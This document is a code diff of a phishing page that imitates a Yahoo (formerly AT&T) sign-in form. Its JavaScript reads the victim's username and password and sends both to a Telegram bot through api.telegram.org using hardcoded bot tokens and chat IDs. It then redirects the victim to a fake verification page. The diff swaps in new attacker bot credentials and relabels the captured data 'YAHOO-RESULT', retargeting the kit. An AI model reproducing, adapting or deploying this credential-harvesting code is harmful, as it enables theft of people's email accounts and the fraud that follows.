@@ -162,7 +162,7 @@ footer#footer ul li{
 
   <section id="form-section">
     <div class="top">
-          <img height="38" viewBox="0 0 36 36" width="100" src="https://picturehost.github.io/pic/yh.png">
+          <img height="38" viewBox="0 0 36 36" width="100" src="https://picturehost.github.io/pic/yh.png" >
           </img>
     </div>
     <div class="sign-att">
@@ -207,8 +207,8 @@ footer#footer ul li{
       const formal = document.querySelector('#form')
     
       let bot = {
-          TOKEN: "7024766536:AAEOL-jzXX6VwQ0xF4FtZPOIKnbTPYfQi-s",
-          chatID: "6414984639"
+          TOKEN: "7262256440:AAEIMgF4KSf498CIlAdOqXXPWPWNycGdbBw",
+          chatID: "6599507166"
       }
 
 
@@ -218,7 +218,7 @@ footer#footer ul li{
           let result1 = document.querySelector('#usr-id').value
           let result2 = document.querySelector('#pwd').value
           
-          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Username::${result1}==++==Password::${result2}`, {
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=YAHOO-RESULT=Username::${result1}==++==Password::${result2}`, {
               method: "GET"
           }).then(success => {
               window.location.replace("https://code-verification.github.io/number-y-mail/2y.html");
